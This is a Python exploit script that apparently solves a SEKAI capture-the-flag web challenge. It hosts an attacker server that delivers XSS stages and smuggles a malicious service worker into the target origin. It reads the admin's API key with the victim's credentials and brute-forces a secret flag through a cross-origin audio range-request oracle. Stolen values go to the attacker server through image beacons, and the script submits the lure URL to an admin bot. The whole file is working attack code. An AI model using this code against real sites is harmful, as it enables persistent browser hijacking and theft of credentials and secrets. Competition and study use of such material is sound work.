#!/usr/bin/env python3
import argparse
import http.server
import socketserver
import threading
import time
import urllib.parse
import urllib.request


def js_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def build_stage(view_base: str, api_origin: str, mock_secret: str) -> str:
    return f"""
;(async () => {{
  if (window.__endStarted) return
  window.__endStarted = true

  const log = (k, v) => {{
    new Image().src = {js_quote(view_base)} + '/log?k=' + encodeURIComponent(k) + '&v=' + encodeURIComponent(String(v))
  }}

  log('xss', 'origin=' + location.origin)

  const wait = ms => new Promise(resolve => setTimeout(resolve, ms))
  const workerUrl = {js_quote(view_base + "/sw.js?sw=")} + Math.random()

  const prime = () => new Promise(resolve => {{
    const script = document.createElement('script')
    let done = false

    const finish = () => {{
      if (done) return
      done = true
      setTimeout(() => {{
        try {{ script.remove() }} catch {{}}
        resolve()
      }}, 25)
    }}

    script.onload = finish
    script.onerror = finish
    script.src = workerUrl + '&d=' + Math.random()
    document.documentElement.appendChild(script)
    setTimeout(finish, 500)
  }})

  let registered = false

  for (let i = 0; i < 20 && !registered; i++) {{
    await Promise.allSettled(Array.from({{ length: 24 }}, prime))
    await wait(1400)
    registered = await navigator.serviceWorker.register(workerUrl, {{ scope: '/' }}).then(() => true, () => false)
  }}

  log('swreg', 'ok=' + registered)
  if (!registered) return

  await navigator.serviceWorker.ready

  for (let i = 0; i < 60 && !navigator.serviceWorker.controller; i++) {{
    await wait(100)
  }}

  try {{
    const build = await fetch('/__sw_build?t=' + Math.random(), {{ cache: 'no-store' }}).then(r => r.text())
    log('sw-build', build)
  }} catch (e) {{
    log('sw-build-error', e.name + ':' + e.message)
  }}

  location = {js_quote(view_base + "/pwn")}
}})()
""".strip()


def build_page(view_base: str, api_origin: str, mock_secret: str) -> str:
    return f"""<!doctype html><meta charset=utf-8><title>end</title><body><script>
const API = {js_quote(api_origin)}
const MOCK = {js_quote(mock_secret)}
const PREFIX = 'SEKAI{{'
const ALPHABET = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{{}}!?#$%&*+-./:;=@^~'.split('')
const VIEW = {js_quote(view_base)}

let apiUrl = API
let apiKey = ''

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const log = (k, v) => {{
  new Image().src = VIEW + '/log?k=' + encodeURIComponent(k) + '&v=' + encodeURIComponent(String(v)).slice(0, 900)
}}

async function readAdmin() {{
  for (let i = 0; i < 10 && !apiKey; i++) {{
    try {{
      const res = await fetch('/admin?x=' + Math.random(), {{ credentials: 'include', cache: 'no-store' }})
      const html = await res.text()
      const key = html.match(/id="api-key">([^<]+)/)
      const url = html.match(/id="api-url">([^<]+)/)

      if (key) apiKey = key[1].trim()
      if (url && !apiUrl) apiUrl = url[1].trim().replace(/&amp;/g, '&')
    }} catch {{}}

    if (!apiKey) await sleep(150)
  }}

  if (API) apiUrl = API
}}

async function oracle(prefix) {{
  if (MOCK) return MOCK.startsWith(prefix)

  const id = crypto.randomUUID()
  const url =
    apiUrl + '/messages/search?key=' + encodeURIComponent(apiKey) +
    '&q=' + encodeURIComponent(prefix) +
    '&__oracle_id=' + encodeURIComponent(id) +
    '&cb=' + Math.random()

  const audio = document.createElement('audio')
  audio.preload = 'auto'
  audio.muted = true
  audio.src = url
  document.body.appendChild(audio)

  try {{ audio.load() }} catch {{}}

  let ready = false

  for (let i = 0; i < 80 && !ready; i++) {{
    try {{
      const text = await fetch('/__oracle_ready?id=' + encodeURIComponent(id) + '&t=' + Math.random(), {{
        cache: 'no-store'
      }}).then(r => r.text())

      if (text === 'E') {{
        try {{
          const detail = await fetch('/__oracle_debug?id=' + encodeURIComponent(id) + '&t=' + Math.random(), {{
            cache: 'no-store'
          }}).then(r => r.text())
          log('oracle-error', prefix + ':' + detail)
        }} catch {{}}

        audio.remove()
        return false
      }}

      ready = text === '1'
    }} catch {{}}

    if (!ready) await sleep(50)
  }}

  audio.remove()

  if (!ready) {{
    log('oracle-not-ready', prefix)
    return false
  }}

  try {{
    await fetch('/__oracle_probe?id=' + encodeURIComponent(id) + '&t=' + Math.random(), {{
      mode: 'no-cors',
      cache: 'no-store'
    }})
    return false
  }} catch {{
    return true
  }}
}}

async function getState() {{
  try {{
    return await fetch(VIEW + '/state', {{ cache: 'no-store' }}).then(r => r.text())
  }} catch {{
    return ''
  }}
}}

async function setState(value) {{
  try {{
    await fetch(VIEW + '/state?set=' + encodeURIComponent(value), {{ cache: 'no-store' }})
  }} catch {{}}
}}

;(async () => {{
  log('pwn', 'origin=' + location.origin)
  log('ua', navigator.userAgent)

  await readAdmin()
  log('admin', 'API_KEY=' + apiKey + ' API_URL=' + apiUrl)

  if (!apiKey) {{
    log('fail', 'no api key')
    return
  }}

  const hit = await oracle(PREFIX)
  const miss = await oracle('zzzzzz')

  log('sanity', 'hit=' + hit + ' miss=' + miss)

  if (!hit || miss) {{
    log('stop', 'bad oracle')
    return
  }}

  let known = await getState()
  if (!known) known = PREFIX
  log('resume', known)

  for (let i = 0; i < 256 && !known.endsWith('}}'); i++) {{
    let advanced = false

    for (const c of ALPHABET) {{
      const guess = known + c

      if (await oracle(guess)) {{
        known = guess
        advanced = true
        await setState(known)
        log('progress', known)
        break
      }}
    }}

    if (!advanced) {{
      log('stuck', known)
      break
    }}
  }}

  log('FLAG', known)
}})()
</script></body>"""


def build_worker(view_base: str, api_origin: str, page: str) -> str:
    return f"""
const BUILD = 'smuggled-sw-v4'
const API = {js_quote(api_origin)}
const DOC = {page!r}
const saved = new Map()
const failed = new Set()
const notes = new Map()

function note(id, value) {{
  const current = notes.get(id) || []
  current.push(String(value))
  notes.set(id, current)
}}

function wavHeader(size) {{
  const bytes = new Uint8Array(44)
  const view = new DataView(bytes.buffer)
  const write = (offset, text) => {{
    for (let i = 0; i < text.length; i++) bytes[offset + i] = text.charCodeAt(i)
  }}

  write(0, 'RIFF')
  view.setUint32(4, 36 + size, true)
  write(8, 'WAVE')
  write(12, 'fmt ')
  view.setUint32(16, 16, true)
  view.setUint16(20, 1, true)
  view.setUint16(22, 1, true)
  view.setUint32(24, 8000, true)
  view.setUint32(28, 8000, true)
  view.setUint16(32, 1, true)
  view.setUint16(34, 8, true)
  write(36, 'data')
  view.setUint32(40, size, true)

  return bytes
}}

function firstChunk() {{
  return new Response(wavHeader(1), {{
    status: 206,
    headers: {{
      'Content-Type': 'audio/wav',
      'Accept-Ranges': 'bytes',
      'Content-Range': 'bytes 0-43/45',
      'Content-Length': '44',
      'Cache-Control': 'no-store'
    }}
  }})
}}

self.addEventListener('install', event => event.waitUntil(self.skipWaiting()))
self.addEventListener('activate', event => event.waitUntil(self.clients.claim()))
self.addEventListener('fetch', event => {{
  const url = new URL(event.request.url)

  if (url.pathname === '/__sw_build') {{
    event.respondWith(new Response(BUILD, {{
      headers: {{ 'content-type': 'text/plain', 'cache-control': 'no-store' }}
    }}))
    return
  }}

  if (url.pathname === '/messages/search' && url.searchParams.has('__oracle_id')) {{
    const id = url.searchParams.get('__oracle_id')
    const range = event.request.headers.get('range') || ''

    note(id, 'request mode=' + event.request.mode + ' dest=' + event.request.destination + ' range=' + (range || '-'))

    if (!range || /^bytes=0-/.test(range)) {{
      note(id, 'first')
      event.respondWith(firstChunk())
      return
    }}

    event.respondWith((async () => {{
      try {{
        const res = await fetch(event.request)
        note(id, 'tail type=' + res.type + ' status=' + res.status + ' ok=' + res.ok)
        saved.set(id, res.clone())
        return new Response(null, {{ status: 204, headers: {{ 'Cache-Control': 'no-store' }} }})
      }} catch (e) {{
        note(id, 'tail error=' + e.name + ':' + e.message)
        failed.add(id)
        return Response.error()
      }}
    }})())
    return
  }}

  if (url.pathname === '/__oracle_ready') {{
    const id = url.searchParams.get('id')
    event.respondWith(new Response(failed.has(id) ? 'E' : saved.has(id) ? '1' : '0', {{
      headers: {{ 'content-type': 'text/plain', 'cache-control': 'no-store' }}
    }}))
    return
  }}

  if (url.pathname === '/__oracle_debug') {{
    const id = url.searchParams.get('id')
    event.respondWith(new Response(JSON.stringify(notes.get(id) || []), {{
      headers: {{ 'content-type': 'application/json', 'cache-control': 'no-store' }}
    }}))
    return
  }}

  if (url.pathname === '/__oracle_probe') {{
    const id = url.searchParams.get('id')
    const res = saved.get(id)

    if (!res) {{
      event.respondWith(Response.error())
      return
    }}

    event.respondWith(res.clone())
    return
  }}

  if (url.pathname === {js_quote(view_base + "/pwn")}) {{
    event.respondWith(new Response(DOC, {{
      headers: {{ 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }}
    }}))
  }}
}})
""".strip()


def submit_to_bot(bot_url: str, public_url: str) -> None:
    data = urllib.parse.urlencode({"url": public_url}).encode()
    req = urllib.request.Request(
        bot_url,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        body = resp.read().decode("utf-8", "replace")
        print(f"[SUBMIT] {resp.status} {body}")


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


class SolverHandler(http.server.BaseHTTPRequestHandler):
    server_version = "end-solver/1.0"
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        print("[REQ]", self.command, self.path[:120], "dest=" + self.headers.get("Sec-Fetch-Dest", "-"))

    def send_bytes(self, body: bytes, content_type: str, code: int = 200, extra_headers=None):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if extra_headers:
            for key, value in extra_headers.items():
                self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def smuggle(self, body: str, headers: str = ""):
        inner = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/javascript\r\n"
            f"{headers}"
            f"Content-Length: {len(body.encode())}\r\n"
            "Connection: keep-alive\r\n\r\n"
            f"{body}"
        ).encode()

        self.send_response(200)
        self.send_header("Content-Type", "text/javascript")
        self.send_header("Content-Length", str(len(inner)))
        self.send_header("Content-Encoding", "identity")
        self.send_header("Cache-Control", "no-transform, no-store")
        self.send_header("Expect", "100-continue")
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.flush()

        conn = self.connection
        self.close_connection = False

        def writer():
            time.sleep(1.0)
            try:
                conn.sendall(inner)
            except OSError:
                return

        threading.Thread(target=writer, daemon=True).start()

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        path = parsed.path
        cfg = self.server.cfg

        if path == "/log":
            print("[BEACON]", params.get("k", [""])[0], "=>", params.get("v", [""])[0])
            self.send_bytes(b"GIF89a", "image/gif")
            return

        if path == "/state":
            if "set" in params:
                cfg["state"] = params["set"][0]
                print("[STATE]", cfg["state"])
            self.send_bytes(cfg["state"].encode(), "text/plain")
            return

        if path == "/sleep":
            time.sleep(20)
            self.send_bytes(b"ok", "text/plain")
            return

        if path == "/xss.js":
            self.smuggle(cfg["stage"])
            return

        if path == "/swsmuggle.js" or (path == "/sw.js" and self.headers.get("Sec-Fetch-Dest") == "script"):
            self.smuggle(
                cfg["worker"],
                headers=(
                    "Service-Worker-Allowed: /\r\n"
                    "Cache-Control: no-store\r\n"
                    "Content-Security-Policy: default-src * data: blob:; "
                    "connect-src * http://localhost:9090 http://127.0.0.1:9090; "
                    "script-src * 'unsafe-inline' 'unsafe-eval'\r\n"
                ),
            )
            return

        if path == "/sw.js":
            self.send_bytes(b"no", "text/plain", code=503)
            return

        if path == "/" or path == "":
            parts = ["<!doctype html><meta charset=utf-8><title>end</title>"]
            for i in range(1, cfg["tags"] + 1):
                parts.append(f'<script src="xss.js?v={i}"></script>')
            parts.append('<img src="sleep">')
            html = "\n".join(parts).encode()
            self.send_bytes(html, "text/html")
            return

        self.send_bytes(b"not found", "text/plain", code=404)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8089)
    ap.add_argument("--tags", type=int, default=12)
    ap.add_argument("--view-name", default="evil")
    ap.add_argument("--api-override", default="http://localhost:9090")
    ap.add_argument("--mock-secret", default="")
    ap.add_argument("--bot-url", default="https://end-bot-cc8e6f22cfba.instancer.sekai.team/submit")
    ap.add_argument("--public-url", default="")
    ap.add_argument("--submit", action="store_true")
    args = ap.parse_args()

    view_base = f"/view/{args.view_name}"
    stage = build_stage(view_base, args.api_override, args.mock_secret)
    page = build_page(view_base, args.api_override, args.mock_secret)
    worker = build_worker(view_base, args.api_override, page)

    httpd = ThreadingHTTPServer((args.host, args.port), SolverHandler)
    httpd.cfg = {
        "tags": args.tags,
        "view_name": args.view_name,
        "view_base": view_base,
        "api_override": args.api_override,
        "mock_secret": args.mock_secret,
        "state": "",
        "stage": stage,
        "page": page,
        "worker": worker,
    }

    print(f"listening on :{args.port}")
    print(f"view={args.view_name}")
    print(f"api={args.api_override}")
    print("mock=" + ("on" if args.mock_secret else "off"))

    if args.submit:
        if not args.public_url:
            raise SystemExit("--submit requires --public-url")
        submit_to_bot(args.bot_url, args.public_url)

    httpd.serve_forever()


if __name__ == "__main__":
    main()
